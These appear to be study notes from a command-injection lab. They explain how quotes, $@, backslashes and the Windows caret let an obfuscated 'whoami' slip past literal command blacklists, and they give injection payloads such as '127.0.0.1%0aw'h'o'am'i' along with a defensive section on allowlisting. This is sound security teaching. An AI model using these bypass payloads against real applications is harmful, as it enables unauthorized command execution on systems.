![Image](https://images.openai.com/static-rsc-4/q4q5Kgn8pqXFaWpxKpjYeWExiKZFGmkBUKwnYZMD44De4EKXtpFiz1nEk3S_k90uqLN7xSLRk1gwD8D-6ekTk0qtXoN9G0ypQWOJ6Qp8nASELQBUAg4j1tf_RLsE63KywKD2wBKgUoJGYzbe9c4uuUwHslk_NoSRdCrzJpgGkIudqaKWl9ioA25h_xQtiaYI?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/uq1YjdlhvMJVKMT0Odxsl-2OEIFVotV_Xr-GBf0puQ9Ylp4A31hwC7sSjfgH7dzC2SBl1jS2Q9CDPc3R8udpfF6R1qRzPrPdfRxj2RvapFyJ9KSjUtKqZZxF2LiLq9PZW320Zaedp4e3pdzURqFojhKAHAv3mXfA5JfpzqLu2AQZD4aL8tVxUsA_riHJheM3?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/1uIjd6tuIh8KboK2CHV31UdO5XsFd4BLDsmFSdhUBI0WRIBXYelkXcAB1dA4YydUIRLcRpIIHprwM2AW0dKlDFF5A9UmK9DYNp5sNGIRb_DSjujTUfImL0_rH_J29m249_UqCsTNCa0FIuw4zgGrQsbVfyLuE90VQiKgMuZxIQ4EUyDHK-ilQuT6KT8XvpB5?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/v8XYLkMyvAVDziIyhwiHTanCD-zt2R9Cu03tZWti-VUV86FrUV-gaJ1vJ9A7F6unEJnyEVFtr2v5M8OPPHhFXfpFG_bhrNNfeZyWFm5t_kbmZp2mCxRM0eyao4XcLO_HVfdWca-HlezuePyzJw6CualklUgfZAfR07gMYyteqpdl4BLa_Am-iB7tU9Qqbca4?purpose=fullsize)

This section moves from **blacklisted characters** to **blacklisted command words**.

The key idea is simple:

> **If a filter looks for the exact text of a dangerous command, we may be able to change the appearance of the command while keeping its meaning to the shell.**

---

# 1. Character Filters vs Command Filters

Previously, we dealt with filters blocking individual characters such as:

```text
;
space
&
|
/
\
```

Now imagine the application also blocks specific **command names**, such as:

```text
whoami
cat
```

The filtering process might look like:

```text
User Input
    ↓
Character Filter
    ↓
Command Blacklist
    ↓
Shell
```

Even if we successfully bypass the character filter, the request can still be rejected because the command itself is blacklisted.

---

# 2. Command Blacklists

A command blacklist is generally a collection of words/commands that the application considers dangerous.

For example, conceptually:

```php
$blacklist = ['whoami', 'cat', ...];
```

The application then checks whether the user's input contains one of those words.

The important weakness is:

> **A simple blacklist may search for the literal string `whoami`, rather than understanding what the shell will ultimately execute.**

For example:

```text
whoami
```

contains the exact blacklisted word.

But a modified representation such as:

```text
w'h'o'am'i
```

doesn't contain the literal string:

```text
whoami
```

Yet the shell can interpret the modified version as the same command.

---

# 3. Command Obfuscation

This technique is called **command obfuscation**.

### Definition

**Command obfuscation** means changing the textual representation of a command while preserving its execution behavior.

Conceptually:

```text
Original command
      ↓
Obfuscation
      ↓
Different-looking input
      ↓
Shell parsing
      ↓
Original command behavior
```

This is useful for understanding why simple blacklists are weak.

---

# 4. Quote-Based Obfuscation

One of the simplest techniques is inserting quotes into the command.

The lab demonstrates:

```bash
w'h'o'am'i
```

Although the command visually looks different from:

```bash
whoami
```

Bash interprets it as the command:

```text
whoami
```

and executes it.

---

# 5. Single Quotes

Example:

```bash
w'h'o'am'i
```

Breakdown:

```text
w
'
h
'
o
'
a
'
m
'
i
```

The shell processes the quoted sections and ultimately obtains the command name.

The resulting behavior is equivalent to:

```bash
whoami
```

---

# 6. Double Quotes

The same basic idea can be demonstrated with double quotes:

```bash
w"h"o"am"i
```

The shell again interprets the command so that it executes as:

```text
whoami
```

Therefore, two common quote characters for this technique are:

```text
'
"
```

---

# 7. Why This Can Bypass a Simple Blacklist

Suppose an application checks:

```text
Is "whoami" present?
```

With:

```text
whoami
```

the answer is:

```text
YES → BLOCK
```

But with:

```text
w'h'o'am'i
```

a simplistic string search may see:

```text
w'h'o'am'i
```

rather than:

```text
whoami
```

Therefore:

```text
Blacklist sees:
w'h'o'am'i

Shell interprets:
whoami
```

This difference between **application-level filtering** and **shell-level interpretation** is the core concept.

---

# 8. Applying It to the Host Checker

The lab previously established that:

```text
127.0.0.1
```

works and that a newline can act as an injection operator.

The obfuscated command can therefore conceptually appear as:

```text
127.0.0.1%0aw'h'o'am'i
```

The important parts are:

```text
127.0.0.1
     ↓
original input

%0a
 ↓
newline / command separation

w'h'o'am'i
     ↓
obfuscated command
```

The application may not detect the literal:

```text
whoami
```

while the shell still interprets the obfuscated form.

---

# 9. Important Rule — Don't Mix Quote Types

The lab highlights an important rule:

> **We cannot mix types of quotes.**

For example, don't assume you can arbitrarily combine:

```text
'
"
```

within the same obfuscation technique.

Keep the quote type consistent when using this particular approach.

---

# 10. Important Rule — Quotes Must Be Balanced

The lab also notes:

> **The number of quotes must be even.**

For example:

```bash
w'h'o'am'i
```

contains paired single quotes.

Similarly:

```bash
w"h"o"am"i
```

contains paired double quotes.

The basic idea is:

```text
Opening quote
      ↓
quoted portion
      ↓
Closing quote
```

If the quotes are not balanced, shell parsing can change dramatically or produce an error.

---

# 11. Linux-Specific Obfuscation

Linux/Bash provides additional techniques.

The lab specifically introduces:

```text
\
$@
```

These can be inserted into commands in ways that allow the shell to interpret the resulting command differently from how a simplistic blacklist sees it.

---

# 12. Using `$@`

The lab example is:

```bash
who$@ami
```

Here:

```text
who
 ↓
$@
 ↓
ami
```

The shell can expand `$@` according to the current positional parameters.

In the demonstrated context, this results in behavior equivalent to:

```text
whoami
```

### Key Point

Unlike the quote technique, the lab notes that:

> **The number of inserted `$@` characters does not have to be even.**

You can insert the relevant character once.

---

# 13. Using Backslashes

Another Linux/Bash example is:

```bash
w\ho\am\i
```

The backslashes alter the textual representation while Bash interprets the command so that it executes as intended.

Conceptually:

```text
w \ ho \ am \ i
```

becomes equivalent to:

```text
whoami
```

for the demonstrated Bash behavior.

---

# 14. Quotes vs `$@` vs `\`

|Technique|Example|Platform|Even number required?|
|---|---|---|---|
|Single quotes|`w'h'o'am'i`|Linux / Windows contexts discussed|Yes|
|Double quotes|`w"h"o"am"i`|Linux / Windows contexts discussed|Yes|
|`$@`|`who$@ami`|Linux/Bash|No|
|Backslash|`w\ho\am\i`|Linux/Bash|No|
|Caret|`who^ami`|Windows CMD|No|

**Note:** Exact parsing behavior depends on the shell and command context.

---

# 15. Windows-Specific Obfuscation

Windows Command Prompt has its own metacharacter that can be useful for understanding command parsing:

```text
^
```

This is called the **caret**.

The lab demonstrates:

```cmd
who^ami
```

which is interpreted by CMD in a way that executes:

```text
whoami
```

---

# 16. Understanding the Caret

In Windows CMD, `^` is commonly used as an escape character.

For the demonstrated example:

```text
who^ami
```

the caret changes how CMD interprets the following character sequence.

Conceptually:

```text
who^ami
   ↓
CMD parsing
   ↓
whoami
```

Again, the key lesson is that:

> **The string inspected by a simplistic blacklist doesn't necessarily equal the command that the shell ultimately interprets.**

---

# 17. Linux vs Windows

### Linux / Bash

Common techniques discussed:

```bash
w'h'o'am'i
```

```bash
w"h"o"am"i
```

```bash
who$@ami
```

```bash
w\ho\am\i
```

### Windows CMD

Example:

```cmd
who^ami
```

The available techniques depend heavily on the shell.

---

# 18. Very Important: Shell Matters

This is one of the most important concepts to remember.

Don't assume:

```bash
w\ho\am\i
```

will behave identically in:

```text
Bash
PowerShell
CMD
```

Likewise:

```cmd
who^ami
```

is specifically associated with CMD parsing.

The correct mental model is:

```text
Web Application
       ↓
Backend Language
       ↓
Command Execution Function
       ↓
Shell / Interpreter
       ↓
Command Parsing
       ↓
Execution
```

You need to understand the **actual shell involved**.

---

# 19. Why Blacklists Are Fragile

Consider a filter:

```php
$blacklist = ['whoami', 'cat'];
```

A developer might believe:

```text
"whoami is blocked."
```

But if the filter only performs literal substring matching, there may be multiple representations that the shell interprets differently.

For example:

```text
whoami
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
```

The textual strings are different, but some can result in the same command behavior in the appropriate shell.

Therefore:

```text
Literal Blacklist
       ≠
Shell-Aware Security
```

---

# 20. Command Obfuscation Pipeline

A useful way to visualize the attack is:

```text
                 User Input
                     │
                     ▼
          ┌────────────────────┐
          │ Application Filter │
          └─────────┬──────────┘
                    │
          Looks for "whoami"
                    │
                    ▼
            Obfuscated Input
                    │
                    ▼
          ┌────────────────────┐
          │ Shell Interpretation│
          └─────────┬──────────┘
                    │
                    ▼
               whoami
                    │
                    ▼
                Execution
```

The filter and shell are effectively looking at different representations of the input.

---

# 21. Connection to Previous Sections

This module is building a progression.

### Stage 1 — Basic Command Injection

```text
127.0.0.1; whoami
```

---

### Stage 2 — Operator Filter

If `;` is blocked:

```text
127.0.0.1
whoami
```

using a newline, where supported.

---

### Stage 3 — Space Filter

Instead of literal space:

```text
${IFS}
```

or another appropriate whitespace representation.

---

### Stage 4 — Character Filter

Generate blocked characters through mechanisms such as:

```text
Environment-variable extraction
Character shifting
```

---

### Stage 5 — Command Filter

Obfuscate the command itself:

```text
w'h'o'am'i
```

The overall progression is:

```text
Injection
   ↓
Operator bypass
   ↓
Space bypass
   ↓
Character bypass
   ↓
Command bypass
```

---

# 22. Recognition Pattern

When working through a controlled lab, a useful methodology is:

```text
Payload blocked?
      │
      ▼
Identify what changed
      │
      ├── Operator?
      │
      ├── Space?
      │
      ├── Character?
      │
      └── Command?
              │
              ▼
       Determine filter type
              │
              ▼
      Understand shell parsing
              │
              ▼
        Test safely in lab
```

The important skill isn't memorizing hundreds of payloads.

It's learning to determine:

> **What layer is blocking me, and how does the next layer interpret the input?**

---

# 23. Defensive Perspective

This section is particularly important from a defensive standpoint.

A blacklist such as:

```php
$blacklist = ['whoami', 'cat'];
```

is inherently fragile.

An attacker may represent the same command differently.

Instead of trying to maintain an enormous blacklist, applications should avoid passing user-controlled data into a shell whenever possible.

### Better approach

```text
User Input
    ↓
Strict validation
    ↓
Allowlist expected format
    ↓
Safe API
    ↓
Arguments passed separately
    ↓
No unnecessary shell interpretation
```

For example, if an application only needs to check an IP address, it should validate that the input is actually an IP address and use an appropriate process/API interface rather than constructing a shell command through string concatenation.

---

# 24. Key Concepts to Remember

### ⭐ 1. Command blacklist

A filter that blocks dangerous command names such as:

```text
whoami
cat
```

---

### ⭐ 2. Command obfuscation

Changing the textual representation of a command while preserving its intended shell interpretation.

---

### ⭐ 3. Quotes

Examples:

```bash
w'h'o'am'i
```

```bash
w"h"o"am"i
```

Remember:

- Don't mix quote types in the demonstrated technique.
    
- Quotes should be balanced.
    

---

### ⭐ 4. Linux `$@`

Example:

```bash
who$@ami
```

The lab demonstrates that this can be interpreted as the original command.

The number of inserted `$@` characters doesn't need to be even.

---

### ⭐ 5. Linux backslash

Example:

```bash
w\ho\am\i
```

The backslash can alter the textual representation while Bash interprets the command accordingly.

---

### ⭐ 6. Windows caret

Example:

```cmd
who^ami
```

CMD's parsing rules allow the caret to alter how the command is interpreted.

---

# 25. Final Cheat Sheet

```text
╔════════════════════════════════════════════╗
║     BYPASSING BLACKLISTED COMMANDS         ║
╚════════════════════════════════════════════╝

COMMAND BLACKLIST
─────────────────────────────────────────────

Example blocked commands:

whoami
cat

Problem:
Literal string matching can be bypassed
by changing the representation of a command.


LINUX / GENERAL QUOTE TECHNIQUES
─────────────────────────────────────────────

Single quotes:

w'h'o'am'i

Double quotes:

w"h"o"am"i

Rules:
• Don't mix quote types
• Quotes should be balanced


LINUX / BASH
─────────────────────────────────────────────

$@:

who$@ami

Backslash:

w\ho\am\i

These depend on Bash parsing/context.


WINDOWS CMD
─────────────────────────────────────────────

Caret:

who^ami

The caret affects CMD parsing.


CORE CONCEPT
─────────────────────────────────────────────

Blacklist sees:

"modified-looking command"

        ↓

Shell parses it

        ↓

Original command behavior


MAIN LESSON
─────────────────────────────────────────────

Literal blacklist
       ≠
Reliable command-injection protection
```

## 🧠 One-Line Revision

> **Blacklisted commands can sometimes be represented in an obfuscated form that does not match the filter's literal string but is interpreted by the target shell as the intended command; this is why simple command blacklists are a fragile security control.**